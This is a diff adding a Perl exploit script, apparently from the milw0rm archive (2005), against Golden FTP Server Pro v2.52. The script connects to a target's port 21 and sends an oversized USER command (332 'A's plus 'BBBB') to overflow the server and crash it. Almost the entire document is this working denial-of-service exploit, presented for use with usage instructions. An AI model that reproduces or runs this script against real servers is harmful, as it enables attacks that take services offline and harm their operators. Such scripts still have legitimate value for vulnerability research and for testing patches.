@@ -1,0 +1,40 @@
+#===== Start GoldenFTPServer_Overflow.pl =====
+#
+# Usage: GoldenFTPServer_Overflow.pl <ip>
+#        GoldenFTPServer_Overflow.pl 127.0.0.1
+#
+# KMiNT21 Software Golden FTP Server Pro v2.52 (10.04.2005)
+#
+# Download:
+# http://www.goldenftpserver.com/
+#
+###########################################################
+
+use IO::Socket;
+use strict;
+
+my($socket) = "";
+
+if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                    PeerPort => "21",
+                                    Proto    => "TCP"))
+{
+        print "Attempting to kill Golden FTP Server at $ARGV[0]:21...";
+
+        sleep(1);
+
+        print $socket "USER " . "A" x 332 . "BBBB\r\n";
+
+        sleep(1);
+
+        print $socket "PASS " . "\r\n";
+
+        close($socket);
+}
+else
+{
+        print "Cannot connect to $ARGV[0]:21\n";
+}
+#===== End GoldenFTPServer_Overflow.pl =====
+
+# milw0rm.com [2005-04-27]
